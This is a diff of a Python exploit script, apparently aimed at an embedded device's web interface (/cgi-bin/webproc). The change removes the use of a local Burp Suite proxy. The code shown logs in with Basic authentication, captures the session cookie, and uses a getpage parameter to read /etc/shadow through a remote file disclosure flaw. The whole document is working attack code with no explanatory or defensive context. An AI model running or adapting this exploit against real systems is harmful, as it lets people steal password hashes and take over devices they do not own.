@@ -24,23 +24,23 @@ def exploit(target, ID, password):
 	encookie = base64.encodestring(base)
 
 	#to use burpsuite
-	proxies = {'http':'http://localhost:8080', 'https':'http://localhost:8080'}
+	#proxies = {'http':'http://localhost:8080', 'https':'http://localhost:8080'}
 
 	s = requests.Session()
 
 	#get sessionid
 	URL = 'http://'+target+'/cgi-bin/webproc'
 	headers = {'Authorization' : 'Basic ' + encookie.rstrip('\n')}
-	res = s.get(URL, headers=headers, proxies=proxies)
+	res = s.get(URL, headers=headers)
 
 	#set sessionid & login
 	dic = s.cookies.get_dict()
 	cookies = {'Cookie' : 'sessionid=' + dic.get('sessionid')}
-	res = s.get(URL, headers=headers, cookies=cookies, proxies=proxies)
+	res = s.get(URL, headers=headers, cookies=cookies)
 
 	#Remote File Disclosure
 	URL = 'http://' + target + '/cgi-bin/webproc?getpage=/etc/shadow&var:language=en_us&var:language=en_us&var:menu=advanced&var:page=basic_home'
-	res = s.get(URL, headers=headers, cookies=cookies, proxies=proxies)
+	res = s.get(URL, headers=headers, cookies=cookies)
 
 	check = res.text[6:11]
 
